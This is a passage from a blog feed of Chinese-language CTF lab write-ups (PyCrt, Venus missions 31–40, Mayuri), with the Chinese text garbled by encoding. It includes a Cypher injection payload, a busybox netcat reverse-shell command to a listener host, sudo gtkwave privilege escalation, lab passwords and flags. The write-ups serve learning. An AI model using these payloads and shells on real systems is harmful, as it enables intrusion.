User chatlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service
```

`chatlake` ÂèØ‰ª•ÂÖçÂØÜÂêØÂä®‰∏Ä‰∏™Âêç‰∏∫ `irc_bot.service` ÁöÑÊúçÂä°„ÄÇÊ£ÄÊü•ËØ•ÊúçÂä°Êñá‰ª∂ÂèëÁé∞ÔºåÂÆÉ‰ºö‰ª• `pycrtlake` Áî®Êà∑Ë∫´‰ªΩËøêË°å‰∏Ä‰∏™PythonËÑöÊú¨ `/usr/local/bin/irc_bot.py`Ôºå‰∏îÊàë‰ª¨Êó†Ê≥ïÁõ¥Êé•‰øÆÊîπËøô‰∏§‰∏™Êñá‰ª∂„ÄÇ

ËøôË°®ÊòéÊèêÊùÉÈúÄË¶Å‰∏éËøô‰∏™IRCÊú∫Âô®‰∫∫ËøõË°å‰∫§‰∫í„ÄÇ

1.  È¶ñÂÖàÔºåÂêØÂä®ËØ•ÊúçÂä°Ôºö`sudo /usr/bin/systemctl start irc_bot.service`„ÄÇ
2.  ‰ΩøÁî® `weechat` ÂÆ¢Êà∑Á´ØËøûÊé•Âà∞Êú¨Âú∞ `6667` Á´ØÂè£ÔºåÂπ∂Âä†ÂÖ•È¢ëÈÅì„ÄÇ

```
/server add x localhost/6667
/connect x
/LIST
         ‚îÇ00:56:17       x  -- | End of message of the day.
         ‚îÇ00:56:46       x  -- | Channel Users Name
         ‚îÇ00:56:46       x  -- | #chan2(1): [+nt]
         ‚îÇ00:56:46       x  -- | #chan3(1): [+nt]
         ‚îÇ00:56:46       x  -- | #chan4(1): [+nt]
         ‚îÇ00:56:46       x  -- | #chan5(1): [+nt]
         ‚îÇ00:56:46       x  -- | #chan6(1): [+nt]
         ‚îÇ00:56:46       x  -- | #chan1(1): [+nt]
```

3.  Âú®È¢ëÈÅì6‰∏≠Ôºå‰∏Ä‰∏™Âêç‰∏∫ `@admin` ÁöÑÊú∫Âô®‰∫∫ÊèêÁ§∫ÈúÄË¶ÅÈÅµÂæ™‚ÄúÊ†ºÂºèË¶ÅÊ±Ç‚ÄùÔºåÂπ∂‰ª• `:)` ÁªìÂ∞æ„ÄÇ
4.  **ÂèëÁé∞ÊºèÊ¥ûÂà©Áî®Êù°‰ª∂Ôºö** ‰∏éÊú∫Âô®‰∫∫‰∫§‰∫íÂêéÂèëÁé∞ÔºåÂÖ∂Â≠òÂú®‰∏Ä‰∏™Â§çÊùÇÁöÑËß¶ÂèëÊú∫Âà∂Ôºö
    - **Ê†ºÂºèË¶ÅÊ±ÇÔºö** ÂëΩ‰ª§ÂÜÖÂÆπÂøÖÈ°ªÊòØ**‰ª•Á©∫Ê†ºÂàÜÈöîÁöÑASCIIÂçÅËøõÂà∂ÁºñÁ†Å**ÔºåÂπ∂‰ª• :) ÁªìÂ∞æ„ÄÇÂú®ÊµãËØï‰∏≠ÂèëÁé∞ÔºåÊú∫Âô®‰∫∫‰ºöÊãíÁªùÊâÄÊúâÂåÖÂê´Â≠óÊØçÁöÑÁõ¥Êé•ÂëΩ‰ª§Ôºå‰ΩÜÊé•ÂèóÁ∫ØÊï∞Â≠óËæìÂÖ•ÔºåËøôÂº∫ÁÉàÊöóÁ§∫‰∫ÜÈúÄË¶ÅËøõË°åÁºñÁ†ÅËΩ¨Êç¢„ÄÇ
    - **Áî®Êà∑ÂêçË¶ÅÊ±ÇÔºö** ÂøÖÈ°ªÂ∞ÜËá™Â∑±ÁöÑÊòµÁß∞Êõ¥Êîπ‰∏∫ ll104567 (/nick ll104567)ÔºåÂê¶ÂàôÊú∫Âô®‰∫∫‰ºöÊãíÁªùÊâßË°åÂëΩ‰ª§„ÄÇ
    - **‰∫§‰∫íÈÄªËæëÔºö** ÊûÑÈÄ†Â•ΩÁöÑÂëΩ‰ª§ÈúÄË¶ÅÂèëÈÄÅÂà∞ #chan1 ÂÖ¨ÂÖ±È¢ëÈÅìÔºå‰ΩÜÂëΩ‰ª§ÁöÑÊâßË°åÁªìÊûú‰ºöÁî±Êú∫Âô®‰∫∫ @admin **ÁßÅËÅä**ÂõûÊòæ„ÄÇ

5. Ê†πÊçÆ‰ª•‰∏äÊù°‰ª∂ÔºåÊûÑÈÄ†ÂèçÂºπshellÁöÑASCIIÁ†ÅpayloadÔºåÂπ∂Âú®#chan1È¢ëÈÅìÂèëÈÄÅ„ÄÇ
6. Âú®ÁõëÂê¨Á´ØÂè£ÊàêÂäüÊé•Êî∂Âà∞ pycrtlake Áî®Êà∑ÁöÑshell„ÄÇ

## **3. pycrtlake -&gt; root**

ËøôÊòØÊúÄÂêé‰∏ÄÊ≠•ÊèêÊùÉ„ÄÇÂú® `pycrtlake` shell‰∏≠ÊâßË°å `sudo -l`„ÄÇ

```bash
pycrtlake@PyCrt:~$ sudo -l
...
User pycrtlake may run the following commands on PyCrt:
    (ALL) NOPASSWD: /usr/bin/gtkwave
```

`pycrtlake` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜ‰ª• `root` Ë∫´‰ªΩËøêË°åGUIÁ®ãÂ∫è `gtkwave`„ÄÇ

1. Áõ¥Êé•ËøêË°å‰ºöÂõ†Áº∫Â∞ë `DISPLAY` ÁéØÂ¢ÉÂèòÈáèËÄåÂ§±Ë¥•„ÄÇ

2. ËØ•Á®ãÂ∫èÁöÑ `-W` ÂëΩ‰ª§Ë°åÊ®°Âºè‰πüÂõ†ÂêåÊ†∑ÂéüÂõ†Êó†Ê≥ïÁõ¥Êé•‰ΩøÁî®„ÄÇ

3. **ÊúÄÁªàËß£ÂÜ≥ÊñπÊ°àÔºö** ‰ΩøÁî® **Xvfb (X Virtual Framebuffer)** ÂàõÂª∫‰∏Ä‰∏™ËôöÊãüÁöÑÂõæÂΩ¢ÁéØÂ¢ÉÊù•Ê¨∫È™ó `gtkwave`„ÄÇ

4. È¶ñÂÖàÔºåÂú® `/tmp` ÁõÆÂΩïÂêØÂä®‰∏Ä‰∏™ËôöÊãüÊòæÁ§∫ÊúçÂä°„ÄÇ

   ```bash
   Xvfb :1 &amp;
   ```

5. Âà©Áî® `gtkwave` ÁöÑ `-W` (wish) ÂèÇÊï∞ÔºåÂú®ÊåáÂÆöÁöÑËôöÊãüÊòæÁ§∫ÁéØÂ¢É‰∏≠ÂêØÂä®‰∏Ä‰∏™Êã•Êúâ `root` ÊùÉÈôêÁöÑTcl‰∫§‰∫íÂºèÂëΩ‰ª§Ë°å„ÄÇ

   ```bash
   sudo DISPLAY=:1 /usr/bin/gtkwave -W
   ```

6. ÂëΩ‰ª§ÊâßË°åÂêéÔºå‰ºöÂæóÂà∞‰∏Ä‰∏™TclÁöÑÊèêÁ§∫Á¨¶ `%`„ÄÇÂú®Ëøô‰∏™ `root` ÊùÉÈôêÁöÑshell‰∏≠ÔºåÂèØ‰ª•Áõ¥Êé•ËØªÂèñ `root` ÁõÆÂΩï‰∏ãÁöÑÊúÄÁªàflag„ÄÇ

   ```tcl
   % id
   uid=0(root) gid=0(root) groups=0(root)
   % cat /root/root.txt /home/chatlake/user.txt
   flag{e80ecc46ca5e00bf8a51c47f0cc3e868}
   flag{b42baba466402e32157a1cbba819664e}
   ```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Pycrt.html</guid><pubDate>Sat, 09 Aug 2025 06:02:46 +0000</pubDate></item><item><title>hmv_Labs_venus31to40</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus31to40.html</link><description># **Mission 0x31: kira -&gt; veronica**

- **‰ªªÂä°**: Áî®Êà∑ `veronica` ÁªèÂ∏∏ËÆøÈóÆ `http://localhost/waiting.php`„ÄÇ

1. ‰ΩøÁî® `curl` ËÆøÈóÆËØ•È°µÈù¢Ôºå‰ºöÊî∂Âà∞‰∏ÄÊù°‰ø°ÊÅØÔºåÊèêÁ§∫ÊúçÂä°Âô®Ê≠£Âú®Á≠âÂæÖ‰∏Ä‰∏™ÁâπÂÆöÁöÑ User-Agent„ÄÇ

   ```bash
   kira@venus:~$ curl http://localhost/waiting.php
   Im waiting for the user-agent PARADISE. 
   ```

2. Ê†πÊçÆÊèêÁ§∫ÔºåÂú® `curl` ËØ∑Ê±Ç‰∏≠ÈÄöËøá `-H` ÂèÇÊï∞ËÆæÁΩÆ `User-Agent` ‰∏∫ `PARADISE`ÔºåÊàêÂäüËé∑ÂèñÂØÜÁ†Å„ÄÇ

   ```bash
   kira@venus:~$ curl -H 'User-Agent: PARADISE' http://localhost/waiting.php
   QTOel6BodTx2cwX 
   ```

3. **veronica ÁöÑÂØÜÁ†Å**: `QTOel6BodTx2cwX`

# **Mission 0x32: veronica -&gt; lana**

- **‰ªªÂä°**: Áî®Êà∑ `veronica` ‰∏∫ `lana` ÁöÑÂØÜÁ†ÅÂàõÂª∫‰∫Ü‰∏Ä‰∏™Âà´Âêç (alias)„ÄÇ

1. Âú® `veronica` ÁöÑ‰ºöËØù‰∏≠Ôºå‰ΩøÁî® `alias` ÂëΩ‰ª§ÂèØ‰ª•ÂàóÂá∫ÊâÄÊúâÂ∑≤ÂÆö‰πâÁöÑÂà´Âêç„ÄÇ

   ```bash
   veronica@venus:~$ alias
   alias lanapass='UWbc0zNEVVops1v'
   alias ls='ls --color=auto'
   ```

2. Âêç‰∏∫ `lanapass` ÁöÑÂà´ÂêçÁõ¥Êé•Êö¥Èú≤‰∫Ü `lana` ÁöÑÂØÜÁ†Å„ÄÇ

3. **lana ÁöÑÂØÜÁ†Å**: `UWbc0zNEVVops1v`

# **Mission 0x33: lana -&gt; noa**

- **‰ªªÂä°**: Áî®Êà∑ `noa` ÂñúÊ¨¢ÂéãÁº©Â•πÁöÑ‰∏úË•ø„ÄÇ

1. Âú®ÂÆ∂ÁõÆÂΩï‰∏≠ÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `zip.gz` ÁöÑÊñá‰ª∂„ÄÇÂ∞ΩÁÆ°ÂêéÁºÄÊòØ `.gz`Ôºå‰ΩÜ‰ΩøÁî® `file` ÂëΩ‰ª§Ê£ÄÊü•ÂèëÁé∞ÂÆÉÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™ `tar` ÂΩíÊ°£Êñá‰ª∂„ÄÇÔºàLabs‰∏çËÆ∏Ëß£ÂéãÂú®ËØ•Êú∫Âô®ÔºåÊâÄ‰ª•ÈúÄË¶Å‰Ω†Ëá™Â∑±ÊÉ≥ÂäûÊ≥ïÊãâÂéªÊú¨Âú∞ÔºåÂèØ‰ª•‰ΩøÁî®bsae64Â§çÂà∂ÊãâÂèñÔºâ

2. Â∞ÜÂÖ∂Ëß£ÂéãÂêéÔºå‰ºöÂæóÂà∞‰∏Ä‰∏™Âêç‰∏∫ `zip` ÁöÑÊñá‰ª∂ÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∫ÜÂØÜÁ†Å„ÄÇ

   ```bash
   # Âú®Êú¨Âú∞Êú∫Âô®‰∏äÊìç‰Ωú
   $ file zip.gz
   zip.gz: POSIX tar archive (GNU)
   $ tar -xvf zip.gz
   pwned/lana/zip
   $ cat pwned/lana/zip 
   9WWOPoeJrq6ncvJ
   ```

3. **noa ÁöÑÂØÜÁ†Å**: `9WWOPoeJrq6ncvJ`

# **Mission 0x34: noa -&gt; maia**

- **‰ªªÂä°**: `maia` ÁöÑÂØÜÁ†ÅË¢´‚ÄúÂûÉÂúæ‚ÄùÂåÖÂõ¥ÁùÄ„ÄÇ

1. Âú®ÂÆ∂ÁõÆÂΩï‰∏≠Êúâ‰∏Ä‰∏™Âêç‰∏∫ `trash` ÁöÑÊñá‰ª∂ÔºåÈáåÈù¢ÂÖÖÊª°‰∫ÜÈöèÊú∫ÁöÑ‚ÄúÂûÉÂúæ‚ÄùÊï∞ÊçÆ„ÄÇ

2. ‰ΩøÁî® `strings` ÂëΩ‰ª§ÂèØ‰ª•‰ªé‰∫åËøõÂà∂Êñá‰ª∂‰∏≠ÊèêÂèñÂèØÊâìÂç∞ÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰ªéËÄåÂú®ÂûÉÂúæÊï∞ÊçÆ‰∏≠ÊâæÂà∞ÁúüÊ≠£ÁöÑÂØÜÁ†Å„ÄÇ

   ```bash
   noa@venus:~$ strings trash
   ...
   \nh1hnDPHpydEjoEN
   ...
   ```

3. **maia ÁöÑÂØÜÁ†Å**: `h1hnDPHpydEjoEN`

# **Mission 0x35: maia -&gt; gloria**

- **‰ªªÂä°**: `gloria` ÂøòËÆ∞‰∫ÜÂ•πÂØÜÁ†ÅÁöÑÊúÄÂêé‰∏§‰∏™Â≠óÁ¨¶ÔºåÂè™ËÆ∞ÂæóÊòØ‰∏§‰∏™Â∞èÂÜôÂ≠óÊØç„ÄÇ

1. Âêç‰∏∫ `forget` ÁöÑÊñá‰ª∂ÁªôÂá∫‰∫ÜÂØÜÁ†ÅÁöÑÂ∑≤Áü•ÈÉ®ÂàÜÔºö`v7xUVE2e5bjUc??`„ÄÇ

2. ËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÊö¥ÂäõÁ†¥Ëß£Âú∫ÊôØ„ÄÇÂèØ‰ª•ÁºñÂÜô‰∏Ä‰∏™ËÑöÊú¨ÁîüÊàêÊâÄÊúâÂèØËÉΩÁöÑÂ∞èÂÜôÂ≠óÊØçÁªÑÂêàÔºà‰ªé `aa` Âà∞ `zz`ÔºâÔºåÁÑ∂Âêé‰ΩøÁî® `hydra` Á≠âÂ∑•ÂÖ∑ÂØπ `gloria` ÁöÑ SSH ÊúçÂä°ËøõË°åÂØÜÁ†ÅÁàÜÁ†¥„ÄÇ

   ```bash
   for a in {a..z}; do for b in {a..z}; do echo 'v7xUVE2e5bjUc${a}${b}'; done; done |tac &gt; pass
   ```

3. ÊúÄÁªàÊâæÂà∞ÁöÑÊ≠£Á°ÆÂØÜÁ†ÅÊòØ `v7xUVE2e5bjUcxw`„ÄÇ

# **Mission 0x36: gloria -&gt; alora**

- **‰ªªÂä°**: `alora` ÂñúÊ¨¢ÁîªÁîªÔºåÊâÄ‰ª•Â•πÊääÂØÜÁ†ÅÂ≠òÊàê‰∫Ü‰∏ÄÂπÖ‚ÄúÁîª‚Äù„ÄÇ

1.  ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `image` Êñá‰ª∂ÂÜÖÂÆπÊòØ‰∏ÄÂ§ßÁâáÁî± `#` Â≠óÁ¨¶ÁªÑÊàêÁöÑ ASCII Ëâ∫ÊúØ„ÄÇ
2.  ËøôÂπÖ‚ÄúÁîª‚ÄùÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™‰∫åÁª¥Á†Å (QR Code)„ÄÇ‰ΩøÁî®ÊâãÊú∫ÊàñÂú®Á∫ø‰∫åÁª¥Á†ÅÊâ´ÊèèÂ∑•ÂÖ∑Êâ´ÊèèÂç≥ÂèØÂæóÂà∞ÂØÜÁ†Å„ÄÇ
3.  **alora ÁöÑÂØÜÁ†Å**: `mhrTFCoxGoqUxtw`

# **Mission 0x37: alora -&gt; julie**

- **‰ªªÂä°**: Áî®Êà∑ `julie` ÂàõÂª∫‰∫Ü‰∏Ä‰∏™ÂåÖÂê´Â•πÂØÜÁ†ÅÁöÑ ISO Êñá‰ª∂„ÄÇ

1. Âú®ÂÆ∂ÁõÆÂΩï‰∏≠ÊâæÂà∞ `music.iso` Êñá‰ª∂„ÄÇÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® `strings` ÂëΩ‰ª§Âú®Êñá‰ª∂‰∏≠Êü•ÊâæÂèØÁñëÁöÑÂØÜÁ†ÅÂ≠óÁ¨¶‰∏≤„ÄÇ

   ```bash
   alora@venus:~$ strings music.iso
   ...
   sjDf4i2MSNgSvOv
   ...
   ```

2. **julie ÁöÑÂØÜÁ†Å**: `sjDf4i2MSNgSvOv`

# **Mission 0x38: julie -&gt; irene**

- **‰ªªÂä°**: `irene` Áõ∏‰ø°‚ÄúÁæéÂú®‰∫é‰∏çÂêå‚Äù„ÄÇ

1. ÂÆ∂ÁõÆÂΩï‰∏ãÊúâ‰∏§‰∏™Êñá‰ª∂Ôºö`1.txt` Âíå `2.txt`„ÄÇËøô‰∏™ÊèêÁ§∫ÊöóÁ§∫ÈúÄË¶ÅÊâæÂá∫ÂÆÉ‰ª¨‰πãÈó¥ÁöÑÂ∑ÆÂºÇ„ÄÇ

2. ‰ΩøÁî® `diff` ÂëΩ‰ª§ÊØîËæÉËøô‰∏§‰∏™Êñá‰ª∂„ÄÇ

   ```bash
   julie@venus:~$ diff 1.txt 2.txt
   174c174
   &lt; 8VeRLEFkBpe2DSD
   ---
   &gt; aNHRdohjOiNizlU
   ```

3. Â∑ÆÂºÇ‰πãÂ§ÑÊòæÁ§∫‰∫Ü‰∏§Ë°å‰∏çÂêåÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂÖ∂‰∏≠‰∏Ä‰∏™ÊòØÂØÜÁ†Å„ÄÇÁªèËøáÂ∞ùËØïÔºå`8VeRLEFkBpe2DSD` ÊòØÊ≠£Á°ÆÁöÑÂØÜÁ†Å„ÄÇ

4. **irene ÁöÑÂØÜÁ†Å**: `8VeRLEFkBpe2DSD`

# **Mission 0x39: irene -&gt; adela**

- **‰ªªÂä°**: `adela` ÊääÂ•πÁöÑÂØÜÁ†ÅÂÄüÁªô‰∫Ü `irene`„ÄÇ

1. `irene` ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™Âä†ÂØÜÊñá‰ª∂ `pass.enc` Âíå‰∏Ä‰∏™ÁßÅÈí•Êñá‰ª∂ `id_rsa.pem`„ÄÇ

2. ËøôË°®ÊòéÂØÜÁ†ÅÊòØ‰ΩøÁî® RSA Âä†ÂØÜÁöÑ„ÄÇ‰ΩøÁî® `openssl` ÂíåÁªôÂÆöÁöÑÁßÅÈí•ÂèØ‰ª•Ëß£ÂØÜÊñá‰ª∂ÂÜÖÂÆπ„ÄÇ

   ```bash
   irene@venus:~$ openssl rsautl -decrypt -inkey id_rsa.pem -in pass.enc
   nbhlQyKuaXGojHx
   ```

3. **adela ÁöÑÂØÜÁ†Å**: `nbhlQyKuaXGojHx`

# **Mission 0x40: adela -&gt; sky**

- **‰ªªÂä°**: `sky` ÊääÂ•πÁöÑÂØÜÁ†Å‰øùÂ≠òÂú®ÂèØ‰ª•‚ÄúÂê¨Âà∞‚ÄùÁöÑ‰∏úË•øÈáå„ÄÇ

1. `adela` ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™Âêç‰∏∫ `wtf` ÁöÑÊñá‰ª∂ÔºåÂÜÖÂÆπÊòØ‰∏Ä‰∏≤ÁÇπÂíåÂàí„ÄÇ

   ```bash
   adela@venus:~$ cat wtf
   .--. .- .--. .- .--. .- .-. .- -.. .. ... .
   ```

2. ËøôÊòéÊòæÊòØÊë©ÊñØÂØÜÁ†Å„ÄÇ‰ΩøÁî®Âú®Á∫øÂ∑•ÂÖ∑ËøõË°åÁøªËØëÔºåÂæóÂà∞ `PAPAPARADISE`„ÄÇ

3. Â∞ùËØï‰ΩøÁî®ËØ•ÂØÜÁ†ÅÁôªÂΩïÂ§±Ë¥•Ôºå‰ΩÜÂ∞ÜÂÖ∂ËΩ¨Êç¢‰∏∫Â∞èÂÜô `papaparadise` ÂêéÊàêÂäüÁôªÂΩï„ÄÇ

4. **sky ÁöÑÂØÜÁ†Å**: `papaparadise`

***

# **Flag**

```
31. veronica:      8===iSSeKzoDXsKy8WPuqNPg===D~~
32. lana:          8===um3Hno2AsjFjuLWsfmDj===D~~
33. noa:           8===HUNGevKdeKwcCvJru1CC===D~~
34. maia:          8===nu8IDScKFAXVcnFutKtG===D~~
35. gloria:        8===RZIkEtaEp18tLslTopJj===D~~
36. alora:         8===NSe78N2lM7IbvHzvrC0G===D~~
37. julie:         8===Iwe1QpxTcx0A8Uusqjfe===D~~
38. irene:         8===c9hgLkLGzsNw7mB3VEr4===D~~
39. adela:         8===86XGXQefUeV2eEdrUzxx===D~~
40. sky:           8===8T2IE4fNIvbs8sh1lnew===D~~

Hidden Flags:
40.sky:            8===nyqRAOwkVRTiMYeePdes===D~~
```

# **Pass**

```
31: veronica/QTOel6BodTx2cwX
32: lana/UWbc0zNEVVops1v
33: noa/9WWOPoeJrq6ncvJ
34: maia/h1hnDPHpydEjoEN
35: gloria/v7xUVE2e5bjUcxw
36: alora/mhrTFCoxGoqUxtw
37: julie/sjDf4i2MSNgSvOv
38: irene/8VeRLEFkBpe2DSD
39: adela/nbhlQyKuaXGojHx
40: sky/papaparadise
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Labs_venus31to40.html</guid><pubDate>Fri, 08 Aug 2025 14:57:51 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Mayuri</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Mayuri.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÁöÑ IP Âú∞ÂùÄÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**
ÈÄöËøá `arp-scan` Êâ´ÊèèÔºåÁ°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ IP ‰∏∫ `192.168.205.138`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.138 08:00:27:cb:36:de       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè‰∏éÊúçÂä°ËØÜÂà´:**
`nmap` ÁöÑÊâ´ÊèèÁªìÊûúÊòæÁ§∫ÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü **22 (SSH)**„ÄÅ**80 (HTTP)** Âíå **8080 (HTTP-Proxy)** Á´ØÂè£„ÄÇËøõ‰∏ÄÊ≠•ÁöÑÊúçÂä°ÁâàÊú¨‰æ¶ÊµãÁ°ÆËÆ§‰∫Ü Web ÊúçÂä°Áî± Apache 2.4.62 È©±Âä®ÔºåSSH ÊúçÂä°‰∏∫ OpenSSH 8.4p1„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.138
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p22,80,8080 -sC -sV 192.168.205.138
...
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Êú™Êù•ÈÅìÂÖ∑Á†îÁ©∂ÊâÄ | Future Gadget Lab
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Êú™Êù•ÈÅìÂÖ∑Á†îÁ©∂ÊâÄ - Labmem ËÆ§ËØÅ
...
```

## 2. Web ÊúçÂä°‰æ¶ÂØü

*   **80 Á´ØÂè£**: ËøôÊòØ‰∏Ä‰∏™Êú™Êù•ÈÅìÂÖ∑Á†îÁ©∂ÊâÄÁöÑ‰∫ßÂìÅÊü•ËØ¢È°µÈù¢ÔºåÂÖÅËÆ∏Áî®Êà∑ÈÄöËøá `sid` Êü•ËØ¢ÂïÜÂìÅ‰ø°ÊÅØ„ÄÇ
*   **8080 Á´ØÂè£**: ËøôÊòØ‰∏Ä‰∏™ÂêéÂè∞ÁôªÂΩïÈ°µÈù¢„ÄÇ

# ‰∫å„ÄÅÊºèÊ¥ûÂà©Áî®‰∏éÂàùÂßãËÆøÈóÆ

## 1. Cypher Ê≥®ÂÖ•ÊºèÊ¥ûÂèëÁé∞‰∏éÂà©Áî®

ÂØπ 80 Á´ØÂè£ÁöÑÊü•ËØ¢ÂäüËÉΩËøõË°åÊµãËØï„ÄÇËæìÂÖ• `' OR 1=1` Êó∂ÔºåÈ°µÈù¢ËøîÂõû‰∫ÜÁâπÂÆöÁöÑÈîôËØØ‰ø°ÊÅØ `Error in: M?TCH (n:?h?p) whe?re n.sid = ' + sid + ' RET?RN n;`ÔºåËøôË°®ÊòéÂêéÁ´ØÂèØËÉΩ‰ΩøÁî®‰∫Ü Neo4j ÂõæÊï∞ÊçÆÂ∫ìÔºåÂπ∂‰∏îÊü•ËØ¢ËØ≠Âè•ÊòØÁõ¥Êé•ÊãºÊé•ÊûÑÈÄ†ÁöÑÔºåÂ≠òÂú® Cypher Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇ

ÁªèËøá‰∏ÄÁ≥ªÂàóÁöÑÈªëÁõíÊµãËØï‰∏éÊûÑÈÄ†ÔºåÊúÄÁªàÂèëÁé∞‰ª•‰∏ã payload ÂèØ‰ª•ÁªïËøáÈôêÂà∂Âπ∂Ê≥ÑÈú≤Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊâÄÊúâËäÇÁÇπ‰ø°ÊÅØÔºö

`1 WITH 1 AS dummy MATCH (m) RETURN m AS n //`

**ÂéüÁêÜÂàÜÊûê**:
ËØ• payload Âà©Áî®‰∫Ü `WITH` Â≠êÂè•ÈáçÁΩÆÊü•ËØ¢‰∏ä‰∏ãÊñáÁöÑÁâπÊÄßÔºåÂπ∂ÁªìÂêàÂà´Âêç `AS n` Ê¨∫È™óÂêéÁ´ØÂ∫îÁî®ÈÄªËæëÔºåÊúÄÂêéÈÄöËøáÊ≥®ÈáäÁ¨¶ `//` Ëß£ÂÜ≥ËØ≠Ê≥ïÈîôËØØÔºåÊàêÂäüÊâßË°å‰∫Ü `MATCH (m)` ‰ª•Êü•ËØ¢ÊâÄÊúâÊï∞ÊçÆ„ÄÇ

**‰ø°ÊÅØÊ≥ÑÈú≤:**
ÊâßË°åËØ•Ê≥®ÂÖ•ÂêéÔºå‰ªéËøîÂõûÁöÑÊï∞ÊçÆ‰∏≠ÂèëÁé∞‰∫ÜÁî®Êà∑Âá≠ÊçÆÔºö

*   **Áî®Êà∑**: `Okabe`
*   **ÂØÜÁ†Å**: `OOOkkkaaabbbeee`

## 2. Ëé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê (www-data)

‰ΩøÁî®Ê≥ÑÈú≤ÁöÑÂá≠ÊçÆ `Okabe:OOOkkkaaabbbeee` ÊàêÂäüÁôªÂΩï 8080 Á´ØÂè£ÁöÑÂêéÂè∞„ÄÇÂêéÂè∞Êèê‰æõ‰∫Ü‰∏Ä‰∏™ 'D-Mail ÁªàÁ´Ø' ÂäüËÉΩÔºåËøôÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™ÂëΩ‰ª§ÊâßË°åÂêéÈó®„ÄÇ

Âà©Áî®ËØ•ÂêéÈó®ÊâßË°åÂèçÂºπ Shell ÂëΩ‰ª§ÔºåÂú®Êú¨Âú∞ÁõëÂê¨Âπ∂ÊàêÂäüËé∑Âèñ‰∫Ü‰∏Ä‰∏™ `www-data` Áî®Êà∑ÁöÑ Shell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨ (Kali):**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888
```

**Ëß¶ÂèëÂèçÂºπ Shell (ÈÄöËøáÂêéÂè∞ÁªàÁ´Ø):**

```bash
busybox nc 192.168.205.128 8888 -e /bin/bash
```

ÊàêÂäüËé∑Âæó `www-data` ÊùÉÈôêÁöÑ‰∫§‰∫íÂºè Shell„ÄÇ

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. ‰ªé `www-data` Âà∞ `kyoma`

Á®≥ÂÆö Shell

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

Âú®Á®≥ÂÆö Shell ÂêéÔºåÊ£ÄÊü•ÁéØÂ¢ÉÂèòÈáèÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `Pass` ÁöÑÂèòÈáè„ÄÇ

```bash
www-data@Mayuri:/$ env
...
Pass=1.129848
...
```

ÂêåÊó∂ÔºåÂèëÁé∞Á≥ªÁªü‰∏≠Â≠òÂú®Áî®Êà∑ `kyoma`„ÄÇÊä±ÁùÄÂ∞ùËØïÁöÑÂøÉÊÄÅÔºå‰ΩøÁî®Ëøô‰∏™ÂØÜÁ†ÅÂàáÊç¢Áî®Êà∑„ÄÇ

```bash
www-data@Mayuri:/$ su kyoma
Password: 1.129848
kyoma@Mayuri:/$ id
uid=1001(kyoma) gid=1001(kyoma) groups=1001(kyoma)
```

ÊàêÂäüÂàáÊç¢Âà∞ `kyoma` Áî®Êà∑ÔºåÂπ∂Âú®ÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞Á¨¨‰∏Ä‰∏™ flag `user.txt`„ÄÇ

## 2. ‰ªé `kyoma` Âà∞ `root`

Âú® `kyoma` Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∏Ä‰∏™ÂÖ∑Êúâ SUID ÊùÉÈôêÁöÑÂèØÊâßË°åÊñá‰ª∂ `TimeMachine`„ÄÇ

```bash
kyoma@Mayuri:~$ ls -al
...
-rwsr-xr-x 1 root root  17208 Aug  6 07:35 TimeMachine
